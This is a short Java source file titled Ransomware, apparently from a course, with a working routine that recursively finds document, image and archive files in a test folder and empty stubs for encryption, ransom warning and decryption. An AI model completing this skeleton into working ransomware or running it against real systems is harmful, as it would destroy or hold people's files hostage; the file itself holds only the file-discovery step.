import org.apache.commons.io.FileUtils;
import java.util.*;
import java.io.*;

public class Ransomware {

  public static void main(String[] args) {
    System.out.println("Hello Ransomware");
    FileFinder();
    Encryptor();
    Warning();
    Decryptor();
  }

  // file finder
  public static void FileFinder() {
    // setting up path
    File root = new File("C:\\Courses\\cross-platform-java-ransomware\\ransomware\\test");
    try {
      // common extensions
      String[] extensions = {"pdf", "doc", "png", "txt", "zip", "rar", "jpg", "xls"};
      // collection of found files
      Collection files = FileUtils.listFiles(root, extensions, true); // true = recursive
      // looping collection
      for(Object o: files) {
        // file instance
        File file = (File) o;
        // return files to the Encryptor function
        System.out.println("Found: " + file.getAbsolutePath());
      }
    } catch(Exception e) {
      e.printStackTrace();
    }
  }

  public static void Encryptor() {}
  public static void Warning() {}
  public static void Decryptor() {}
}
